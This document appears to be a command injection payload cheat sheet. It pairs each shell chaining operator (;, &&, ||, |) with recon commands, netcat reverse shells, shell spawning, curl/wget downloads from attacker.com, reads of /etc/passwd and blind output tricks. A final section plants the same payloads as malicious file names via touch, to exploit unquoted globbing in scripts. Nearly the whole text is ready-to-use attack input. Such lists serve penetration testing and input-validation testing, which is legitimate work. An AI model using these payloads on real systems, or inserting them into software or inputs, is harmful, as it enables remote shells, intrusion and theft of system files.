# OS Command Injection

## Injection Operators

Each payload below is shown with all four chaining operators. Pick the one that works for your context:

| Operator | Behaviour |
|----------|-----------|
| `;` | Execute regardless of previous command result |
| `&&` | Execute only if previous command succeeded |
| `\|\|` | Execute only if previous command failed |
| `\|` | Pipe output of previous command into this one |

---

## Identity / Recon

```
;whoami
&&whoami
||whoami
|whoami
;id
&&id
||id
|id
```

## Reverse Shells (nc)

```
;nc -e /bin/sh 127.0.0.1 4444
&&nc -e /bin/sh 127.0.0.1 4444
||nc -e /bin/sh 127.0.0.1 4444
|nc -e /bin/sh 127.0.0.1 4444
;netcat -e /bin/bash 127.0.0.1 4444
&&netcat -e /bin/bash 127.0.0.1 4444
||netcat -e /bin/bash 127.0.0.1 4444
|netcat -e /bin/bash 127.0.0.1 4444
;nc 127.0.0.1 4444 -e /bin/bash
&&nc 127.0.0.1 4444 -e /bin/bash
||nc 127.0.0.1 4444 -e /bin/bash
|nc 127.0.0.1 4444 -e /bin/bash
;$(nc -e /bin/sh 127.0.0.1 5555)
&&$(nc -e /bin/sh 127.0.0.1 5555)
||$(nc -e /bin/sh 127.0.0.1 5555)
|$(nc -e /bin/sh 127.0.0.1 5555)
```

## Spawn a Shell

```
;bash
&&bash
||bash
|bash
;sh
&&sh
||sh
|sh
;bash -i
&&bash -i
||bash -i
|bash -i
```

## Shell via -c Flag

```
;bash -c "whoami"
&&bash -c "whoami"
||bash -c "whoami"
|bash -c "whoami"
;sh -c "id"
&&sh -c "id"
||sh -c "id"
|sh -c "id"
```

## Download & Execute

```
;curl http://attacker.com/shell
&&curl http://attacker.com/shell
||curl http://attacker.com/shell
|curl http://attacker.com/shell
;wget http://attacker.com/shell
&&wget http://attacker.com/shell
||wget http://attacker.com/shell
|wget http://attacker.com/shell
;$(curl http://attacker.com/shell.sh)
&&$(curl http://attacker.com/shell.sh)
||$(curl http://attacker.com/shell.sh)
|$(curl http://attacker.com/shell.sh)
```

## Backtick / Subshell Execution

```
;`whoami`
$(whoami)
;`id`
$(id)
;`nc -e /bin/sh 127.0.0.1 4444`
$(nc -e /bin/sh 127.0.0.1 4444)
;`bash`
$(bash)
;`curl http://attacker.com/shell`
$(curl http://attacker.com/shell)
```

## Variable Expansion

```
;$(whoami)
&&$(whoami)
||$(whoami)
|$(whoami)
;$(id)
&&$(id)
||$(id)
|$(id)
;echo $USER
&&echo $USER
||echo $USER
|echo $USER
```

## File Read

```
;cat /etc/passwd
&&cat /etc/passwd
||cat /etc/passwd
|cat /etc/passwd
```

## Connectivity Check

```
;ping -c 1 attacker.com
&&ping -c 1 attacker.com
||ping -c 1 attacker.com
|ping -c 1 attacker.com
```

## Output to File (Blind)

```
;whoami > /tmp/out
&&whoami > /tmp/out
||whoami > /tmp/out
|whoami > /tmp/out
;id > /tmp/id
&&id > /tmp/id
||id > /tmp/id
|id > /tmp/id
```

---

## Filename-Based Injection (touch)

Create files with malicious names to trigger injection when filenames are processed (e.g. by scripts using `*` or unquoted variables):

```bash
# Identity / Recon
touch ';whoami'
touch '&&whoami'
touch '||whoami'
touch '|whoami'
touch ';id'
touch '&&id'
touch '||id'
touch '|id'

# Reverse Shells (nc)
touch ';nc -e /bin/sh 127.0.0.1 4444'
touch '&&nc -e /bin/sh 127.0.0.1 4444'
touch '||nc -e /bin/sh 127.0.0.1 4444'
touch '|nc -e /bin/sh 127.0.0.1 4444'
touch ';netcat -e /bin/bash 127.0.0.1 4444'
touch '&&netcat -e /bin/bash 127.0.0.1 4444'
touch '||netcat -e /bin/bash 127.0.0.1 4444'
touch '|netcat -e /bin/bash 127.0.0.1 4444'
touch ';nc 127.0.0.1 4444 -e /bin/bash'
touch '&&nc 127.0.0.1 4444 -e /bin/bash'
touch '||nc 127.0.0.1 4444 -e /bin/bash'
touch '|nc 127.0.0.1 4444 -e /bin/bash'
touch ';$(nc -e /bin/sh 127.0.0.1 5555)'
touch '&&$(nc -e /bin/sh 127.0.0.1 5555)'
touch '||$(nc -e /bin/sh 127.0.0.1 5555)'
touch '|$(nc -e /bin/sh 127.0.0.1 5555)'

# Spawn a Shell
touch ';bash'
touch '&&bash'
touch '||bash'
touch '|bash'
touch ';sh'
touch '&&sh'
touch '||sh'
touch '|sh'
touch ';bash -i'
touch '&&bash -i'
touch '||bash -i'
touch '|bash -i'

# Shell via -c Flag
touch ';bash -c "whoami"'
touch '&&bash -c "whoami"'
touch '||bash -c "whoami"'
touch '|bash -c "whoami"'
touch ';sh -c "id"'
touch '&&sh -c "id"'
touch '||sh -c "id"'
touch '|sh -c "id"'

# Download & Execute
touch ';curl http://attacker.com/shell'
touch '&&curl http://attacker.com/shell'
touch '||curl http://attacker.com/shell'
touch '|curl http://attacker.com/shell'
touch ';wget http://attacker.com/shell'
touch '&&wget http://attacker.com/shell'
touch '||wget http://attacker.com/shell'
touch '|wget http://attacker.com/shell'
touch ';$(curl http://attacker.com/shell.sh)'
touch '&&$(curl http://attacker.com/shell.sh)'
touch '||$(curl http://attacker.com/shell.sh)'
touch '|$(curl http://attacker.com/shell.sh)'

# Backtick / Subshell Execution
touch ';\`whoami\`'
touch '$(whoami)'
touch ';\`id\`'
touch '$(id)'
touch ';\`nc -e /bin/sh 127.0.0.1 4444\`'
touch '$(nc -e /bin/sh 127.0.0.1 4444)'
touch ';\`bash\`'
touch '$(bash)'
touch ';\`curl http://attacker.com/shell\`'
touch '$(curl http://attacker.com/shell)'

# Variable Expansion
touch ';$(whoami)'
touch '&&$(whoami)'
touch '||$(whoami)'
touch '|$(whoami)'
touch ';$(id)'
touch '&&$(id)'
touch '||$(id)'
touch '|$(id)'
touch ';echo $USER'
touch '&&echo $USER'
touch '||echo $USER'
touch '|echo $USER'

# File Read
touch ';cat /etc/passwd'
touch '&&cat /etc/passwd'
touch '||cat /etc/passwd'
touch '|cat /etc/passwd'

# Connectivity Check
touch ';ping -c 1 attacker.com'
touch '&&ping -c 1 attacker.com'
touch '||ping -c 1 attacker.com'
touch '|ping -c 1 attacker.com'

# Output to File (Blind)
touch ';whoami > /tmp/out'
touch '&&whoami > /tmp/out'
touch '||whoami > /tmp/out'
touch '|whoami > /tmp/out'
touch ';id > /tmp/id'
touch '&&id > /tmp/id'
touch '||id > /tmp/id'
touch '|id > /tmp/id'
```
